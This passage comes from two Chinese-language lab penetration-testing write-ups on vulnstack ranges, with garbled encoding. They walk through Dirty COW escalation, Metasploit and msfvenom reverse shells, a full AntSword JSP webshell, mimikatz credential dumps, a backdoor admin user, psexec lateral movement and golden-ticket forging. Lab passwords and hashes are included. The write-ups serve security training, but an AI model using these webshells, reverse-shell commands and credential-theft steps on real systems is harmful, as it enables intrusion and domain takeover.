class="line">yy:x:1000:1000:yy,,,:/home/yy:/bin/bash</span><br><span class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">www:x:1001:1001::/home/www:/sbin/nologin</span><br></pre></td></tr></table></figure>

<p><code>netstat -ano</code> æŸ¥çœ‹å¼€æ”¾ç«¯å£ï¼Œçœ‹åˆ°å¼€æ”¾äº†22 80å’Œ3306</p>
<p>å°è¯•åˆšæ‰åœ¨tmpä¸­æ‰¾åˆ°çš„è´¦å·ç™»å½•sshï¼ŒæˆåŠŸç™»å½•</p>
<p><code>ssh wwwuser@192.168.3.42 -p 22</code>  <code>wwwuser_123Aqx</code></p>
<p><img src="/posts/2ce9ab7f/ssh_login.png"></p>
<p>æŸ¥çœ‹ipæ—¶å‘ç°å’Œèšå‰‘shellä¸Šçš„ipä¸åŒï¼Œæ˜¯å¦ä¸€å°æœºå™¨ï¼Œåº”è¯¥ä½¿ç”¨åˆ°çš„æ˜¯nginxåå‘ä»£ç†</p>
<h4 id="è„ç‰›ææƒ"><a href="#è„ç‰›ææƒ" class="headerlink" title="è„ç‰›ææƒ"></a>è„ç‰›ææƒ</h4><p>ä½¿ç”¨è„ç‰›ææƒ</p>
<p>ä¸‹è½½åœ°å€:<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
<p>å°†dirty.cä¸Šä¼ åˆ°èšå‰‘ ä½¿ç”¨wgetä¸‹è½½</p>
<p><img src="/posts/2ce9ab7f/wget_dirtyc.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">./dirty test123</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/dirtycow.png"></p>
<p>æˆåŠŸææƒä¸ºfirefartæƒé™</p>
<h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><h4 id="ä¸Šçº¿MSF"><a href="#ä¸Šçº¿MSF" class="headerlink" title="ä¸Šçº¿MSF"></a>ä¸Šçº¿MSF</h4><p>ä½¿ç”¨exploit/multi/script/web_delivery</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target 7    # é€‰æ‹©ç›®æ ‡ç³»ç»Ÿ å¯ä»¥show targets æŸ¥çœ‹ 7æ˜¯linux</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.3.43  # kaliçš„ip</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/msf_web_delivery.png"><br>å¤åˆ¶payloadåˆ°ç›®æ ‡æœºå™¨è¿è¡Œï¼Œå¾—åˆ°åå¼¹shell<br><img src="/posts/2ce9ab7f/msf_web_delivery2.png"></p>
<hr>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨msfvenomç”Ÿæˆshell</p>
<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.42 LPORT=4444 -f elf &gt; shell.elf</code></p>
<p>ä½¿ç”¨èšå‰‘ä¸Šä¼ ï¼Œç„¶åå†centosæœºå™¨ä¸Šä¸‹è½½shell</p>
<p><code>wget  http://192.168.3.42/templates/beez3/shell.elf</code></p>
<p><code>chmod +x shell.elf</code></p>
<p>åœ¨kaliä¸Šå¼€å¯ç›‘å¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost kaliçš„ip</span><br><span class="line">lhost =&gt; 192.168.3.43</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<h4 id="æ·»åŠ è·¯ç”±"><a href="#æ·»åŠ è·¯ç”±" class="headerlink" title="æ·»åŠ è·¯ç”±"></a>æ·»åŠ è·¯ç”±</h4><p><code> use post/multi/manage/autoroute</code></p>
<p><img src="/posts/2ce9ab7f/autoroute.png"></p>
<h4 id="è®¾ç½®ä»£ç†"><a href="#è®¾ç½®ä»£ç†" class="headerlink" title="è®¾ç½®ä»£ç†"></a>è®¾ç½®ä»£ç†</h4><p><code>use auxiliary/server/socks_proxy</code></p>
<p><code>sudo vim /etc.proxychains4.conf</code> ä¿®æ”¹ä¸º socks 127.0.0.1</p>
<h4 id="å­˜æ´»ä¸»æœºæ¢æµ‹"><a href="#å­˜æ´»ä¸»æœºæ¢æµ‹" class="headerlink" title="å­˜æ´»ä¸»æœºæ¢æµ‹"></a>å­˜æ´»ä¸»æœºæ¢æµ‹</h4><h5 id="åˆ©ç”¨icmpåè®®æ¢æµ‹å­˜æ´»ä¸»æœº"><a href="#åˆ©ç”¨icmpåè®®æ¢æµ‹å­˜æ´»ä¸»æœº" class="headerlink" title="åˆ©ç”¨icmpåè®®æ¢æµ‹å­˜æ´»ä¸»æœº"></a>åˆ©ç”¨icmpåè®®æ¢æµ‹å­˜æ´»ä¸»æœº</h5><p><code>for k in $( seq 1 255);do ping -c 1 192.168.93.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</code> æ‰«åˆ°5å°å­˜æ´»ä¸»æœº</p>
<p><img src="/posts/2ce9ab7f/icmp.png"></p>
<h5 id="smbæ‰«æ"><a href="#smbæ‰«æ" class="headerlink" title="smbæ‰«æ"></a>smbæ‰«æ</h5><p><code>use auxiliary/scanner/smb/smb_version</code></p>
<p><code> set rhosts 192.168.93.0/24</code></p>
<p><code>set thread 10</code></p>
<p><code>run</code></p>
<p>æ‰«åˆ°3å°windowsæœºå™¨</p>
<p><img src="/posts/2ce9ab7f/smb_10.png"></p>
<p><img src="/posts/2ce9ab7f/smb_20.png"></p>
<p><img src="/posts/2ce9ab7f/smb_30.png"></p>
<p>æ‰€ä»¥åŸŸå†…çš„5å°ä¸»æœºéƒ½å¯ä»¥ç¡®å®šäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.93.10	windows 2012</span><br><span class="line">192.168.93.20	windows 2008</span><br><span class="line">192.168.93.30	windows 7	</span><br><span class="line">192.168.93.100  centos</span><br><span class="line">192.168.93.120  ubuntu(nginxåå‘ä»£ç†)</span><br></pre></td></tr></table></figure>

<h4 id="å†…ç½‘ä¸»æœºç«¯å£æ¢æµ‹"><a href="#å†…ç½‘ä¸»æœºç«¯å£æ¢æµ‹" class="headerlink" title="å†…ç½‘ä¸»æœºç«¯å£æ¢æµ‹"></a>å†…ç½‘ä¸»æœºç«¯å£æ¢æµ‹</h4><p>ä½¿ç”¨nmapæ‰«æä¸€ä¸‹å†…ç½‘ä¸­çš„3å°windowsä¸»æœºå¼€æ”¾çš„ç«¯å£.</p>
<p><code>proxychains4 nmap 192.168.93.10 -Pn -sT -sV -F</code></p>
<p><img src="/posts/2ce9ab7f/nmap_10.png"></p>
<p>åŒæ ·çš„æ–¹æ³•æ‰«ä¸€ä¸‹20 30 ä¸»æœº</p>
<p><img src="/posts/2ce9ab7f/nmap_20.png"></p>
<p><img src="/posts/2ce9ab7f/nmap_30.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.93.10     80.135.139.445          win2012</span><br><span class="line">192.168.93.20     80,135,139,445,1433     win2008R2</span><br><span class="line">192.168.93.30     135,139,445             win7</span><br></pre></td></tr></table></figure>

<h4 id="æ¼æ´æ‰«æ"><a href="#æ¼æ´æ‰«æ" class="headerlink" title="æ¼æ´æ‰«æ"></a>æ¼æ´æ‰«æ</h4><p>ä½¿ç”¨ms17-010æ‰«ä¸€æ³¢æ¼æ´</p>
<p><code>use /scanner/smb/smb_ms17_010</code></p>
<p><img src="/posts/2ce9ab7f/ms17-010.png"></p>
<p>æ²¡æœ‰å‘ç°æ¼æ´</p>
<h4 id="å¼±å£ä»¤çˆ†ç ´"><a href="#å¼±å£ä»¤çˆ†ç ´" class="headerlink" title="å¼±å£ä»¤çˆ†ç ´"></a>å¼±å£ä»¤çˆ†ç ´</h4><p>å…ˆçˆ†ç ´ä¸€ä¸‹win2008R2ä¸»æœºçš„mssql smb</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set rhosts 192.168.93.20</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set PASS_FILE /usr/share/wordlists/PASSWORD_top1000.txt</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>è‡ªå·±è·‘æ²¡è·‘å‡ºå¯†ç äº†â€¦.çœ‹äº†å…¶ä»–å¸ˆå‚…è·‘å‡ºæ¥çš„å¯†ç æ˜¯<code>123qwe!ASD</code></p>
<h4 id="ä½¿ç”¨wmiè¿æ¥shell"><a href="#ä½¿ç”¨wmiè¿æ¥shell" class="headerlink" title="ä½¿ç”¨wmiè¿æ¥shell"></a>ä½¿ç”¨wmiè¿æ¥shell</h4><p><code>proxychains4 python2 wmiexec.py  &#39;administrator:123qwe!ASD@192.168.93.20&#39;</code></p>
<p>æˆåŠŸè¿æ¥20ä¸»æœºçš„shell</p>
<p><img src="/posts/2ce9ab7f/wmiexec_shell_20.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">tasklist -V</span><br><span class="line">net view </span><br><span class="line">net view /domain</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">åŸŸæ§æ˜¯192.168.93.10 </span><br><span class="line">åŸŸå†…æœ‰ä¸‰å°æœºå™¨  \\WIN-8GA56TNV3MV                                                              </span><br><span class="line">                \\WIN2008                                                                      </span><br><span class="line">                \\WIN7    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨smbclientä¸Šä¼ mimikatz"><a href="#ä½¿ç”¨smbclientä¸Šä¼ mimikatz" class="headerlink" title="ä½¿ç”¨smbclientä¸Šä¼ mimikatz"></a>ä½¿ç”¨smbclientä¸Šä¼ mimikatz</h4><p><code>proxychains4 smbclient //192.168.93.20/C$ -U administrator</code></p>
<p><img src="/posts/2ce9ab7f/smbclient.png"></p>
<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.log</code></p>
<p><img src="/posts/2ce9ab7f/logonpasswords.png"></p>
<p>å¾—åˆ°åŸŸæ§è´¦å·å¯†ç  <code>Administrator</code>   <code>zxcASDqw123!!</code></p>
<h4 id="ä½¿ç”¨ipcè¿æ¥åŸŸæ§"><a href="#ä½¿ç”¨ipcè¿æ¥åŸŸæ§" class="headerlink" title="ä½¿ç”¨ipcè¿æ¥åŸŸæ§"></a>ä½¿ç”¨ipcè¿æ¥åŸŸæ§</h4><p><code>net use \\192.168.93.10\ipc$ zxcASDqw123!! /user:&quot;TEST\Administrator&quot;</code></p>
<p><img src="/posts/2ce9ab7f/ipc_flag.png"></p>
<p>å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack2é¶åœº</title>
    <url>/posts/8a9ea0cb/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ç»Ÿä¸€ç™»å½•å¯†ç  <code>1qaz@WSX</code></p>
<p>Webå¯†ç é”™è¯¯çš„ï¼Œåœ¨å¿«ç…§ç®¡ç†å™¨é‡Œé¢é€‰æ‹©è½¬åˆ°1.3å³å¯,é»˜è®¤ä¸ºç©ºï¼Œç„¶åä¿®æ”¹å¯†ç ä¸ºç»Ÿä¸€å¯†ç </p>
<p>ç„¶åå†webä¸»æœºä¸Šå¼€å¯WeblogicæœåŠ¡</p>
<p><img src="/posts/8a9ea0cb/start_weblogic.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dc    ä»…ä¸»æœº  10.10.10.10</span><br><span class="line">web   ä»…ä¸»æœº  10.10.10.80   NAT 192.168.0.80</span><br><span class="line">pc    ä»…ä¸»æœº  10.10.10.201  NAT 192.168.0.201</span><br><span class="line">kali  NAT     192.168.0.128</span><br></pre></td></tr></table></figure>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="nmapæ‰«æç«¯å£"><a href="#nmapæ‰«æç«¯å£" class="headerlink" title="nmapæ‰«æç«¯å£"></a>nmapæ‰«æç«¯å£</h4><p>ç”¨kalipingä¸é€šwebä¸»æœºï¼Œåº”è¯¥æ˜¯å¼€å¯äº†é˜²ç«å¢™ç¦æ­¢äº†icmp</p>
<p><code>sudo nmap 192.168.0.80 -sV</code></p>
<blockquote>
<p>PORT      STATE SERVICE       VERSION<br>80/tcp    open  http          Microsoft IIS httpd 7.5<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2008 R2 10.50.4000; SP2<br>3389/tcp  open  ms-wbt-server Microsoft Terminal Service<br>7001/tcp  open  http          Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)<br>49152/tcp open  msrpc         Microsoft Windows RPC<br>49153/tcp open  msrpc         Microsoft Windows RPC<br>49154/tcp open  msrpc         Microsoft Windows RPC<br>49155/tcp open  msrpc         Microsoft Windows RPC<br>49156/tcp open  msrpc         Microsoft Windows RPC</p>
</blockquote>
<p><img src="/posts/8a9ea0cb/nmap.png"></p>
<p>å…ˆä»7001çš„weblogicä¸‹æ‰‹ï¼Œä½¿ç”¨WeblogicScanæ‰«æä¸€ä¸‹æ˜¯å¦å­˜åœ¨æ¼æ´</p>
<p><img src="/posts/8a9ea0cb/weblogicscan.png"></p>
<p>å¾—åˆ°åå°è·¯å¾„ä¸º<code>http://192.168.0.80:7001/console/login/LoginForm.jsp</code></p>
<p>æ£€æµ‹åˆ°å­˜åœ¨<code>CVE20192725</code> å’Œ ssrfæ¼æ´</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="åˆ©ç”¨ssrfæ¼æ´è¿›è¡Œç«¯å£æ¢æµ‹"><a href="#åˆ©ç”¨ssrfæ¼æ´è¿›è¡Œç«¯å£æ¢æµ‹" class="headerlink" title="åˆ©ç”¨ssrfæ¼æ´è¿›è¡Œç«¯å£æ¢æµ‹"></a>åˆ©ç”¨ssrfæ¼æ´è¿›è¡Œç«¯å£æ¢æµ‹</h4><p>å­˜åœ¨ä½ç½®<code>http://192.168.0.80:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
<p>æŠ“åŒ…æµ‹è¯•</p>
<p><img src="/posts/8a9ea0cb/ssrf1.png"></p>
<p>æ­¤å¤„çš„operatorä¸ºå¯æ§ç‚¹ï¼Œè¾“å…¥ä¸€ä¸ªå­˜åœ¨çš„ç«¯å£<code>127.0.0.1:7001</code> ä¼šè¿”å›ä¸€ä¸ªçŠ¶æ€ç </p>
<p><img src="/posts/8a9ea0cb/ssrf_7001.png"></p>
<p>è¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„ç«¯å£æ—¶<code>192.168.0.80:1234</code> ä¼šè¿”å›<code>but could not connect over HTTP to server</code></p>
<p><img src="/posts/8a9ea0cb/ssrf_1234.png"></p>
<p>è¾“å…¥<code>127.0.0.1:6379</code> è¿”å›<code>but could not connect over HTTP to server</code>è¯´æ˜æ²¡æœ‰å¼€æ”¾6379ç«¯å£ï¼Œæ²¡æ³•ç»§ç»­åˆ©ç”¨å»å¼¹redis shell</p>
<p><img src="/posts/8a9ea0cb/ssrf_6379.png"></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/9759761.html">weblogic ssrfåˆ©ç”¨</a></p>
<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>ç›´æ¥ä½¿ç”¨6å“¥å¸ˆå‚…çš„javaååºåˆ—åŒ–ç»ˆææµ‹è¯•å·¥å…·.</p>
<p><img src="/posts/8a9ea0cb/java_tool1.png"></p>
<p><img src="/posts/8a9ea0cb/java_tool2.png"></p>
<p><a href="https://www.cnblogs.com/sstfy/p/10350915.html">weblogicä¸Šä¼ æœ¨é©¬æ—¶è·¯å¾„é€‰æ‹©</a></p>
<p>1.æŠŠshellå†™åˆ°æ§åˆ¶å°imagesç›®å½•ä¸­</p>
<p><code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code></p>
<p>è®¿é—®<code>http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp</code></p>
<p>2.å†™åˆ°uddiexplorerç›®å½•ä¸­</p>
<p><code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\éšæœºå­—ç¬¦\war\shell.jsp</code></p>
<p>è®¿é—®<code>http://*.*.*.*:7001/uddiexplorer/shell.jsp</code></p>
<p>3.å†™åˆ°åº”ç”¨å®‰è£…ç›®å½•ä¸­</p>
<p><code>C:\Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\é¡¹ç›®å\éšæœºå­—ç¬¦\war\shell.jsp</code></p>
<p>è®¿é—®<code>http://*.*.*.*:7001/é¡¹ç›®å/shell.jsp</code></p>
<p>ä¸Šä¼ èšå‰‘çš„jspé©¬ã€‚å¯†ç ä¸ºant</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/8a9ea0cb/uploade_shell.png"></p>
<p>ä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥</p>
<p><img src="/posts/8a9ea0cb/ant_conn.png"></p>
<p>ç„¶åå¯ä»¥ä½¿ç”¨<code>As-Exploits</code>æ’ä»¶</p>
<p>å‘ç°è¯¥æœºå™¨ä¸Šæœ‰å®‰è£…360</p>
<h4 id="ä¸Šçº¿CS"><a href="#ä¸Šçº¿CS" class="headerlink" title="ä¸Šçº¿CS"></a>ä¸Šçº¿CS</h4><p>åœ¨CSä¸Šåˆ›å»ºlistener ç”Ÿæˆcs.exeåä½¿ç”¨èšå‰‘è¿è¡Œï¼ŒbeaconæˆåŠŸä¸Šçº¿</p>
<p><img src="/posts/8a9ea0cb/cs1.png"></p>
<h5 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŸ¥çœ‹å½“å‰ç”¨æˆ·sid  shell whoami /user</span><br><span class="line">æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯  shell systeminfo</span><br><span class="line">æŸ¥çœ‹åŸŸå      shell net config workstation</span><br><span class="line">æŸ¥çœ‹åŸŸå†…ç”¨æˆ·  shell net user /domain</span><br><span class="line">æŸ¥çœ‹æœºå™¨ä¿¡æ¯  net computers </span><br><span class="line">æŸ¥çœ‹åŸŸå†…ä¸»æœº  shell net view</span><br><span class="line">æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ  shell net view /domain</span><br><span class="line">æŸ¥çœ‹åŸŸç®¡ç†å‘˜  shell net group &quot;domain admins&quot; /domain  </span><br><span class="line">æŸ¥çœ‹åŸŸæ§      shell net group &quot;domain controllers&quot; /domain  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>shell whoami /user</code></p>
<p><img src="/posts/8a9ea0cb/cs_whoami_user.png"></p>
<p><code>shell systeminfo</code></p>
<p><img src="/posts/8a9ea0cb/cs_systeminfo.png"></p>
<p><code>shell net config workstation</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_config_workstation.png"></p>
<p><code>shell net user /domain</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_user_domain.png"></p>
<p><code>net computers</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_computers.png"></p>
<p>ä½¿ç”¨CSçš„portscanæ¨¡å—æ‰«æåŸŸå†…ä¸»æœºç«¯å£</p>
<p><img src="/posts/8a9ea0cb/cs_portscan.png"></p>
<p>å…³é—­é˜²ç«å¢™<code>netsh advfirewall set allprofiles state off</code></p>
<p><code>shell net view </code> å‘ç°æŠ¥é”™6118ï¼Œåœ¨ç½‘ä¸ŠæŸ¥äº†ä¸‹æ˜¯å› ä¸ºæ²¡æœ‰å¼€å¯<code>Computer Brower</code>æœåŠ¡ï¼Œå»çœ‹äº†ä¸‹ï¼ŒwebæœåŠ¡å™¨æŠŠè¯¥æœåŠ¡ç¦æ­¢äº†ï¼Œå¼€å¯åå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ï¼ˆå› ä¸ºåˆšæ‰æ˜¯çš„æ—¶å€™webæœåŠ¡å™¨å¯†ç ç™»å½•ä¸ä¸Šå»ï¼Œç„¶ååˆ‡æ¢äº†å¿«ç…§ï¼Œæ‰‹åŠ¨å¼€å¯äº†webæœåŠ¡ï¼‰</p>
<p><img src="/posts/8a9ea0cb/cs_net_view.png"></p>
<p><code>shell net group &quot;domain admins&quot; /domain</code></p>
<p><code>shell net group &quot;domain controllers&quot; /domain </code></p>
<p><img src="/posts/8a9ea0cb/cs_shell_net_group.png"></p>
<p>ä½¿ç”¨CSçš„<code>run_mimikatz</code>æ¨¡å—</p>
<p><img src="/posts/8a9ea0cb/cs_run_mimikatz.png"></p>
<p>å¾—åˆ°å‡­æ®ä¿¡æ¯ï¼Œå¯†ç ä¸º<code>1qaz@WSX</code></p>
<p><img src="/posts/8a9ea0cb/cs_credentials.png"></p>
<h4 id="åˆ›å»ºç”¨æˆ·ç™»å½•3389"><a href="#åˆ›å»ºç”¨æˆ·ç™»å½•3389" class="headerlink" title="åˆ›å»ºç”¨æˆ·ç™»å½•3389"></a>åˆ›å»ºç”¨æˆ·ç™»å½•3389</h4><p>æŸ¥çœ‹3389æ˜¯å¦å¼€æ”¾</p>
<p><img src="/posts/8a9ea0cb/cs_nerstat_3389.png"></p>
<p><img src="/posts/8a9ea0cb/cs_new_user.png"></p>
<p>æ·»åŠ ç”¨æˆ·åˆ°ç®¡ç†å‘˜æƒé™ <code>shell net localgroup administrators Mamor /add</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_localgroup_administrators_Mamor_add.png"></p>
<p><code>sudo rdesktop 192.168.0.80:3389 </code> ä½¿ç”¨ <code>Mamor</code> <code>1qaz@WSX</code>æˆåŠŸç™»å½•</p>
<p><img src="/posts/8a9ea0cb/rdesktop.png"></p>
<p>(æ³¨ï¼šè¿™é‡Œçš„360é˜²æŠ¤å¥½åƒæ²¡æœ‰èµ·ä½œç”¨ï¼Œæ²¡æœ‰è¿›è¡Œæ‹¦æˆª)</p>
<h4 id="ä½¿ç”¨PSexecæ¨ªå‘ç§»åŠ¨"><a href="#ä½¿ç”¨PSexecæ¨ªå‘ç§»åŠ¨" class="headerlink" title="ä½¿ç”¨PSexecæ¨ªå‘ç§»åŠ¨"></a>ä½¿ç”¨PSexecæ¨ªå‘ç§»åŠ¨</h4><p>ä½¿ç”¨å’Œä¸Šä¸€ä¸ªé¶åœºä¸€æ ·çš„æ–¹æ³•ï¼Œåˆ›å»ºä¸€ä¸ªsmbç›‘å¬å™¨</p>
<p>åœ¨Targetsä¸­ é€‰æ‹©ä¸»æœºå³é”®jump-&gt; psexecï¼Œé€‰æ‹©ç¥¨æ®</p>
<p>ç„¶åå¾—åˆ°å¦‚å›¾ï¼Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹æ³•å¾—åˆ°webæœºå™¨çš„systemæƒé™</p>
<p><img src="/posts/8a9ea0cb/cs_graph_view.png"></p>
<p>æˆåŠŸæ‹¿åˆ°åŸŸæ§DC.</p>
<h4 id="CSæ´¾ç”ŸMSF"><a href="#CSæ´¾ç”ŸMSF" class="headerlink" title="CSæ´¾ç”ŸMSF"></a>CSæ´¾ç”ŸMSF</h4><p>åœ¨CSä¸­åˆ›å»ºä¸€ä¸ª Foreign HTTP listener</p>
<p><img src="/posts/8a9ea0cb/cs_msf.png"></p>
<p>åœ¨msfä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt;  set payload windows/meterpreter/reverse_http</span><br><span class="line">set =&gt; payload windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.0.128</span><br><span class="line">lhost =&gt; 192.168.0.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="/posts/8a9ea0cb/cs_msf_shell.png"></p>
<p>msfæ·»åŠ è·¯ç”±</p>
<p><img src="/posts/8a9ea0cb/msf_autoroute.png"></p>
<p><img src="/posts/8a9ea0cb/route_print.png"></p>
<p>é…ç½®ä»£ç†ï¼Œåœ¨proxychains4è®¾ç½®127.0.0.1 1080</p>
<p><img src="/posts/8a9ea0cb/socks_proxy.png"></p>
<h4 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h4><h5 id="åŸŸæ§ä¿¡æ¯æ”¶é›†"><a href="#åŸŸæ§ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸæ§ä¿¡æ¯æ”¶é›†"></a>åŸŸæ§ä¿¡æ¯æ”¶é›†</h5><p>åœ¨åŸŸæ§è·å–krbtgtè´¦æˆ·çš„NTLM hashå€¼å’ŒSID</p>
<p><img src="/posts/8a9ea0cb/dc_hashdump.png"></p>
<p><code>82dfc71b72a11ef37d663047bc2088fb</code></p>
<p><img src="/posts/8a9ea0cb/dc_logonpasswords.png"></p>
<p>SID <code>S-1-5-21-2756371121-2868759905-3853650604</code></p>
<h5 id="é»„é‡‘ç¥¨æ®åˆ©ç”¨"><a href="#é»„é‡‘ç¥¨æ®åˆ©ç”¨" class="headerlink" title="é»„é‡‘ç¥¨æ®åˆ©ç”¨"></a>é»„é‡‘ç¥¨æ®åˆ©ç”¨</h5><p>é»„é‡‘ç¥¨æ®æ—¶ä¼ªé€ ç¥¨æ®æˆäºˆç¥¨æ®(TGT)</p>
<p>åˆ©ç”¨éœ€è¦çš„æ¡ä»¶:</p>
<p>1.åŸŸåç§°</p>
<p>2.åŸŸçš„SIDå€¼</p>
<p>3.åŸŸçš„KRBTGTè´¦æˆ·NTLMå¯†ç å“ˆå¸Œ</p>
<p>4.ä¼ªé€ ç”¨æˆ·å</p>
<p>ä½¿ç”¨CSæ¸…é™¤clientç«¯(åŸŸå†…å…¶ä»–æœºå™¨)çš„ç¥¨æ®</p>
<p><code>kerberos_ticket_purge</code></p>
<p><code>shell klist</code>æŸ¥çœ‹ç¥¨æ®ä¿¡æ¯æ˜¯å¦å·²ç»è¢«æ¸…é™¤</p>
<p><img src="/posts/8a9ea0cb/cs_shell_kilist.png"></p>
<p>ä½¿ç”¨CSç”Ÿæˆé»„é‡‘ç¥¨æ®</p>
<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket.png"></p>
